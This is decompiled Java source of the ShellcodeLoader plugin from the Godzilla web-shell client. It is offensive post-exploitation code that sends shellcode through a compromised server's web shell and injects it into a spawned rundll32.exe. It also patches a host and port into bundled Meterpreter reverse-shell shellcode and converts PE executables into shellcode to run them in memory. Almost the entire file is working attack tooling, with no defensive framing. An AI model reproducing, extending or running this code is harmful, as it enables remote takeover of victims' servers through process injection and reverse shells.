/*     */ package shells.plugins.generic;
/*     */ 
/*     */ import com.kichik.pecoff4j.PE;
/*     */ import com.kichik.pecoff4j.io.PEParser;
/*     */ import core.EasyI18N;
/*     */ import core.Encoding;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GFileChooser;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.ByteArrayInputStream;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTabbedPane;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.border.TitledBorder;
/*     */ import org.fife.ui.rtextarea.RTextArea;
/*     */ import org.fife.ui.rtextarea.RTextScrollPane;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public abstract class ShellcodeLoader
/*     */   implements Plugin
/*     */ {
/*     */   private static final String spawnto_x86 = "C:\\Windows\\SysWOW64\\rundll32.exe";
/*     */   private static final String spawnto_x64 = "C:\\Windows\\System32\\rundll32.exe";
/*     */   protected JPanel panel;
/*     */   protected JButton loadButton;
/*     */   protected JButton runButton;
/*     */   protected JSplitPane splitPane;
/*     */   protected JSplitPane meterpreterSplitPane;
/*     */   protected RTextArea shellcodeTextArea;
/*     */   protected boolean loadState;
/*     */   protected ShellEntity shellEntity;
/*     */   protected Payload payload;
/*     */   protected Encoding encoding;
/*     */   public ShellcodeLoader childLoder;
/*     */   private JPanel shellcodeLoaderPanel;
/*     */   private JPanel meterpreterPanel;
/*     */   private JPanel memoryPePanel;
/*     */   
/*     */   public ShellcodeLoader() {
/*  71 */     this.panel = new JPanel(new BorderLayout());
/*  72 */     this.shellcodeLoaderPanel = new JPanel(new BorderLayout());
/*  73 */     this.meterpreterPanel = new JPanel(new BorderLayout());
/*  74 */     this.memoryPePanel = new JPanel(new BorderLayout());
/*     */ 
/*     */     
/*  77 */     this.excuteFileLabel = new JLabel("注入进程文件: ");
/*  78 */     this.excuteFileTextField = new JTextField("C:\\Windows\\System32\\rundll32.exe", 50);
/*     */ 
/*     */     
/*  81 */     this.hostLabel = new JLabel("host :");
/*  82 */     this.portLabel = new JLabel("port :");
/*  83 */     this.archLabel = new JLabel(String.format("Arch:%s", new Object[] { "none" }));
/*  84 */     this.arch2Label = new JLabel(String.format("Arch:%s", new Object[] { "none" }));
/*  85 */     this.loadButton = new JButton("Load");
/*  86 */     this.runButton = new JButton("Run");
/*  87 */     this.goButton = new JButton("Go");
/*  88 */     this.loadPeButton = new JButton("LoadPe");
/*     */ 
/*     */     
/*  91 */     this.argsLabel = new JLabel("args");
/*  92 */     this.readWaitLabel = new JLabel("readWait(ms)");
/*  93 */     this.argsTextField = new JTextField("");
/*  94 */     this.readWaitTextField = new JTextField("7000");
/*  95 */     this.memoryPeTextArea = new RTextArea();
/*  96 */     this.shellcodeTextArea = new RTextArea();
/*  97 */     this.meterpreterSplitPane = new JSplitPane();
/*  98 */     this.tipTextArea = new RTextArea();
/*  99 */     this.hostTextField = new JTextField("127.0.0.1", 15);
/* 100 */     this.portTextField = new JTextField("4444", 7);
/* 101 */     this.splitPane = new JSplitPane();
/* 102 */     this.tabbedPane = new JTabbedPane();
/*     */     
/* 104 */     this.splitPane.setOrientation(0);
/* 105 */     this.splitPane.setDividerSize(0);
/*     */     
/* 107 */     this.meterpreterSplitPane.setOrientation(0);
/* 108 */     this.meterpreterSplitPane.setDividerSize(0);
/*     */ 
/*     */ 
/*     */     
/* 112 */     JPanel topPanel = new JPanel();
/* 113 */     topPanel.add(this.excuteFileLabel);
/* 114 */     topPanel.add(this.excuteFileTextField);
/*     */ 
/*     */     
/* 117 */     topPanel.add(this.arch2Label);
/*     */ 
/*     */ 
/*     */     
/* 121 */     topPanel.add(this.loadButton);
/* 122 */     topPanel.add(this.runButton);
/*     */     
/* 124 */     this.splitPane.setTopComponent(topPanel);
/* 125 */     this.splitPane.setBottomComponent((Component)new RTextScrollPane((RTextArea)this.shellcodeTextArea));
/*     */     
/* 127 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/* 130 */             ShellcodeLoader.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/* 134 */     this.shellcodeTextArea.setAutoscrolls(true);
/* 135 */     this.shellcodeTextArea.setBorder(new TitledBorder("shellcode hex"));
/* 136 */     this.shellcodeTextArea.setText("");
/*     */     
/* 138 */     this.tipTextArea.setAutoscrolls(true);
/* 139 */     this.tipTextArea.setBorder(new TitledBorder("tip"));
/* 140 */     this.tipTextArea.setText("");
/*     */     
/* 142 */     this.shellcodeLoaderPanel.add(this.splitPane);
/*     */ 
/*     */     
/* 145 */     JPanel meterpreterTopPanel = new JPanel();
/* 146 */     meterpreterTopPanel.add(this.hostLabel);
/* 147 */     meterpreterTopPanel.add(this.hostTextField);
/* 148 */     meterpreterTopPanel.add(this.portLabel);
/* 149 */     meterpreterTopPanel.add(this.portTextField);
/* 150 */     meterpreterTopPanel.add(this.archLabel);
/* 151 */     meterpreterTopPanel.add(this.goButton);
/*     */     
/* 153 */     this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
/* 154 */     this.meterpreterSplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
/*     */     
/* 156 */     this.meterpreterPanel.add(this.meterpreterSplitPane);
/*     */ 
/*     */     
/* 159 */     topPanel = new JPanel();
/* 160 */     topPanel.add(this.argsLabel);
/* 161 */     topPanel.add(this.argsTextField);
/* 162 */     topPanel.add(this.readWaitLabel);
/* 163 */     topPanel.add(this.readWaitTextField);
/* 164 */     topPanel.add(this.loadPeButton);
/*     */ 
/*     */     
/* 167 */     JSplitPane _splitPane = new JSplitPane(0);
/*     */     
/* 169 */     _splitPane.setTopComponent(topPanel);
/* 170 */     _splitPane.setBottomComponent((Component)new RTextScrollPane((RTextArea)this.memoryPeTextArea));
/*     */     
/* 172 */     this.memoryPePanel.add(_splitPane);
/*     */     
/* 174 */     this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
/* 175 */     this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);
/* 176 */     this.tabbedPane.addTab("memoryPe", this.memoryPePanel);
/*     */     
/* 178 */     this.panel.add(this.tabbedPane);
/*     */   }
/*     */   protected JTabbedPane tabbedPane; private RTextArea tipTextArea; private JButton goButton; private JLabel hostLabel; private JLabel portLabel; private JTextField hostTextField; private JTextField portTextField; private JLabel archLabel; private JLabel excuteFileLabel; private JLabel arch2Label; private JTextField excuteFileTextField; private RTextArea memoryPeTextArea; private JButton loadPeButton; private JLabel argsLabel; private JLabel readWaitLabel; private JTextField argsTextField; private JTextField readWaitTextField;
/*     */   
/*     */   public abstract boolean load();
/*     */   
/*     */   public abstract String getClassName();
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/* 187 */     if (!this.loadState) {
/*     */       try {
/* 189 */         if (load()) {
/* 190 */           this.loadState = true;
/* 191 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/* 193 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/* 195 */       } catch (Exception e) {
/* 196 */         Log.error(e);
/* 197 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/* 201 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/* 205 */     if (!this.loadState && 
/* 206 */       "C:\\Windows\\SysWOW64\\rundll32.exe".equals(this.excuteFileTextField.getText()) && 
/* 207 */       this.payload.getFileSize("C:\\Windows\\SysWOW64\\rundll32.exe") <= 0) {
/* 208 */       this.excuteFileTextField.setText("C:\\Windows\\System32\\rundll32.exe");
/*     */     }
/*     */ 
/*     */     
/* 212 */     load();
/* 213 */     String shellcodeHex = this.shellcodeTextArea.getText().trim();
/* 214 */     if (shellcodeHex.length() > 0) {
/* 215 */       byte[] result = runShellcode(functions.hexToByte(shellcodeHex));
/* 216 */       String resultString = this.encoding.Decoding(result);
/* 217 */       Log.log(resultString, new Object[0]);
/* 218 */       GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void goButtonClick(ActionEvent actionEvent) {
/*     */     try {
/* 223 */       String host = this.hostTextField.getText().trim();
/* 224 */       int port = Integer.parseInt(this.portTextField.getText());
/* 225 */       boolean is64 = this.payload.isX64();
/* 226 */       String shellcodeHexString = getMeterpreterShellcodeHex(host, port, is64);
/* 227 */       byte[] result = runShellcode(functions.hexToByte(shellcodeHexString));
/* 228 */       String resultString = this.encoding.Decoding(result);
/* 229 */       Log.log(resultString, new Object[0]);
/* 230 */       GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/* 231 */     } catch (Exception e) {
/* 232 */       GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void loadPeButtonClick(ActionEvent actionEvent) {
/* 237 */     GFileChooser chooser = new GFileChooser();
/*     */     
/* 239 */     chooser.setFileSelectionMode(0);
/* 240 */     boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
/* 241 */     File selectdFile = chooser.getSelectedFile();
/* 242 */     if (flag && selectdFile != null) {
/* 243 */       String fileString = selectdFile.getAbsolutePath();
/*     */       try {
/* 245 */         int readWait = Integer.parseInt(this.readWaitTextField.getText().trim());
/* 246 */         String args = this.argsTextField.getText().trim();
/* 247 */         String excuteFile = this.excuteFileTextField.getText();
/*     */         
/* 249 */         String command = excuteFile + " " + args;
/*     */         
/* 251 */         byte[] peContent = functions.readInputStreamAutoClose(new FileInputStream(fileString));
/*     */         try {
/* 253 */           this.memoryPeTextArea.append(String.format("%s\n", new Object[] { new String(runPe(command, peContent, readWait)) }));
/* 254 */         } catch (Exception e) {
/* 255 */           GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.memoryPePanel), e.getMessage());
/*     */         }
/*     */       
/* 258 */       } catch (Exception e) {
/* 259 */         this.memoryPeTextArea.append(String.format("%s\n", new Object[] { functions.printStackTrace(e) }));
/*     */       } 
/*     */     } 
/*     */   }
/*     */   
/*     */   private byte[] runShellcode(byte[] shellcode) {
/* 265 */     return runShellcode(this.excuteFileTextField.getText(), shellcode, 0);
/*     */   }
/*     */   private byte[] runShellcode(long injectPid, byte[] shellcode) {
/* 268 */     load();
/* 269 */     ReqParameter reqParameter = new ReqParameter();
/* 270 */     reqParameter.add("type", "pid");
/* 271 */     reqParameter.add("shellcode", shellcode);
/* 272 */     reqParameter.add("excuteFile", this.excuteFileTextField.getText());
/* 273 */     byte[] result = this.payload.evalFunc(getClassName(), "run", reqParameter);
/* 274 */     return result;
/*     */   }
/*     */   public byte[] runShellcode(String command, byte[] shellcode, int readWait) {
/* 277 */     return runShellcode(new ReqParameter(), command, shellcode, readWait);
/*     */   }
/*     */   public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
/* 280 */     if (this.childLoder != null) {
/* 281 */       return this.childLoder.runShellcode(reqParameter, command, shellcode, readWait);
/*     */     }
/* 283 */     load();
/* 284 */     if (command == null || command.trim().isEmpty()) {
/* 285 */       reqParameter.add("type", "local");
/*     */     } else {
/* 287 */       reqParameter.add("excuteFile", command);
/* 288 */       reqParameter.add("type", "start");
/*     */     } 
/* 290 */     reqParameter.add("shellcode", shellcode);
/* 291 */     reqParameter.add("readWaitTime", Integer.toString(readWait));
/* 292 */     byte[] result = this.payload.evalFunc(getClassName(), "run", reqParameter);
/* 293 */     return result;
/*     */   }
/*     */   public byte[] runPe(byte[] pe) throws Exception {
/* 296 */     return runPe(this.excuteFileTextField.getText(), pe, 0);
/*     */   }
/*     */   public byte[] runPe(String command, byte[] pe, int readWait) throws Exception {
/* 299 */     if (pe == null || command == null || command.trim().isEmpty()) {
/* 300 */       throw new UnsupportedOperationException(EasyI18N.getI18nString("只支持远程注入!!!"));
/*     */     }
/* 302 */     PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
/* 303 */     if (this.payload.isX64() == peContext.is64()) {
/* 304 */       StringBuilder stringBuilder = new StringBuilder();
/* 305 */       byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
/* 306 */       this.memoryPeTextArea.append(stringBuilder.toString());
/* 307 */       if (shellcode != null) {
/* 308 */         byte[] result = runShellcode(command, shellcode, readWait);
/* 309 */         return result;
/*     */       } 
/* 311 */       throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode时 发生错误!"));
/*     */     } 
/*     */     
/* 314 */     throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("当前进程是Arch:%s Pe是%s"), new Object[] { this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86" }));
/*     */   }
/*     */   
/*     */   public byte[] runPe2(String args, byte[] pe, int readWait) throws Exception {
/* 318 */     if (pe == null || args == null || args.trim().isEmpty()) {
/* 319 */       throw new UnsupportedOperationException(EasyI18N.getI18nString("只支持远程注入!!!"));
/*     */     }
/* 321 */     PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
/* 322 */     if (this.payload.isX64() == peContext.is64()) {
/* 323 */       StringBuilder stringBuilder = new StringBuilder();
/* 324 */       byte[] shellcode = PeLoader.peToShellcode(pe, stringBuilder);
/* 325 */       this.memoryPeTextArea.append(stringBuilder.toString());
/* 326 */       if (shellcode != null) {
/* 327 */         byte[] result = runShellcode(this.excuteFileTextField.getText() + " " + args, shellcode, readWait);
/* 328 */         return result;
/*     */       } 
/* 330 */       throw new UnsupportedOperationException(EasyI18N.getI18nString("PeToShellcode时 发生错误!"));
/*     */     } 
/*     */     
/* 333 */     throw new UnsupportedOperationException(String.format(EasyI18N.getI18nString("当前进程是Arch:%s Pe是%s"), new Object[] { this.payload.isX64() ? "x64" : "x86", peContext.is64() ? "x64" : "x86" }));
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 340 */     this.shellEntity = shellEntity;
/* 341 */     this.payload = this.shellEntity.getPayloadModule();
/* 342 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 343 */     automaticBindClick.bindJButtonClick(ShellcodeLoader.class, this, ShellcodeLoader.class, this);
/* 344 */     this.arch2Label.setText(String.format("Arch:%s", new Object[] { this.payload.isX64() ? "x64" : "x86" }));
/* 345 */     this.archLabel.setText(String.format("Arch:%s", new Object[] { this.payload.isX64() ? "x64" : "x86" }));
/*     */     
/* 347 */     if (this.payload.isX64()) {
/* 348 */       this.excuteFileTextField.setText("C:\\Windows\\System32\\rundll32.exe");
/*     */     } else {
/* 350 */       this.excuteFileTextField.setText("C:\\Windows\\SysWOW64\\rundll32.exe");
/*     */     } 
/*     */     
/* 353 */     updateMeterpreterTip();
/*     */   }
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 358 */     return this.panel;
/*     */   }
/*     */   public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
/* 361 */     String shellcodeHex = "";
/*     */     try {
/* 363 */       InputStream inputStream = ShellcodeLoader.class.getResourceAsStream(String.format("assets/reverse%s.bin", new Object[] { is64 ? "64" : "" }));
/* 364 */       shellcodeHex = new String(functions.readInputStream(inputStream));
/* 365 */       inputStream.close();
/* 366 */       shellcodeHex = shellcodeHex.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host)));
/* 367 */       shellcodeHex = shellcodeHex.replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short)port)));
/* 368 */     } catch (Exception e) {
/* 369 */       Log.error(e);
/*     */     } 
/* 371 */     return shellcodeHex;
/*     */   }
/*     */   private void updateMeterpreterTip() {
/*     */     try {
/* 375 */       boolean is64 = this.payload.isX64();
/* 376 */       InputStream inputStream = ShellcodeLoader.class.getResourceAsStream("assets/meterpreterTip.txt");
/* 377 */       String tipString = new String(functions.readInputStream(inputStream));
/* 378 */       inputStream.close();
/* 379 */       tipString = tipString.replace("{arch}", is64 ? "/x64" : "");
/* 380 */       this.tipTextArea.setText(tipString);
/* 381 */     } catch (Exception e) {
/* 382 */       Log.error(e);
/*     */     } 
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\generic\ShellcodeLoader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */